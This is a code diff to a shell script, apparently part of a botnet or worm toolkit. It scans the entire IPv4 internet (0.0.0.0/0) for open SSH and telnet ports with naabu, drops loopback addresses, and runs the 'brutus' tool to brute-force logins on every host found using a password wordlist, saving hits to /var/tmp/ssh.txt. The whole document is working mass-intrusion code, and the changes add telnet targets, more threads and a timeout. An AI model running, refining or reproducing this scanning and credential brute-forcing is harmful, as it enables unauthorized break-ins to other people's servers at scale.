@@ -17,6 +17,11 @@ creds='https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Password
 
 brute() {
 
+
+
+
+
+
 cd /var/tmp/naabu-2.6.1/cmd/naabu
 
 
@@ -27,14 +32,23 @@ tar -xf brutus
 
 chmod  +x brutus 
 
-
-timeout  10s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #120  segundos para  pega os ips
+timeout  20s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #ssh
  
+timeout  20s     ./nabu  -p 23   -host   0.0.0.0/0     >>    ips_nabu  #telnet
+
+
+
+grep -v "^127\." ips_nabu >  my_ips
+
+
+
+timeout  -k   600s   1s      ./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt   -q -t 50     >     /var/tmp/ssh.txt  
  
+#600s is 10 min
 
-./brutus creds   --targets-file  ips_nabu     -U  lista.txt   -P  lista.txt   -q     >     /var/tmp/ssh.txt
 
 
+ 
 
 
 }
